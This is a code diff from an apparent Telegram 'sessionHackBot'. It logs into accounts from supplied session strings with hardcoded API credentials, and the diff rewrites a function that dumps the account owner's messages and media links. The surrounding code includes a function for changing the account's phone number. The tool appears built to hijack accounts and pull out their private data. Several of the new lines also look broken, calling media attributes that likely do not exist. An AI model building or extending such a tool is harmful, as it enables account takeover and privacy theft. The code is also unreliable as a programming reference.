@@ -24,18 +24,41 @@ Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 
 async def savedmsgs(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        try:
-            messages = []
-            async for msg in X.iter_messages('me', reverse=True):
-                if msg.text:
-                    messages.append(msg.text)
-                elif msg.media and hasattr(msg.media, 'document'):
-                    # To handle media messages, you can add specific logic here
-                    pass
-            return "\n".join(messages)
-        except Exception as e:
-            print(e)
-            return "حدث خطأ "
+        messages = []
+        async for message in X.iter_messages(None, from_user='me', media=True):
+            msg_content = f"Message ID: {message.id}\n"
+            
+            if message.text:
+                msg_content += f"Text: {message.text}\n"
+            
+            if message.gif:
+                gif_url = message.gif.url
+                msg_content += f"GIF: {gif_url}\n"
+            
+            if message.photo:
+                photo_url = message.photo.url
+                msg_content += f"Photo: {photo_url}\n"
+            
+            if message.video:
+                video_url = message.video.url
+                msg_content += f"Video: {video_url}\n"
+            
+            if message.document:
+                document_url = message.document.url
+                msg_content += f"Document: {document_url}\n"
+            
+            if message.audio:
+                audio_url = message.audio.url
+                msg_content += f"Audio: {audio_url}\n"
+            
+            if message.voice:
+                voice_url = message.voice.url
+                msg_content += f"Voice: {voice_url}\n"
+            
+            messages.append(msg_content)
+
+        return "\n\n".join(messages)
+
 
 async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
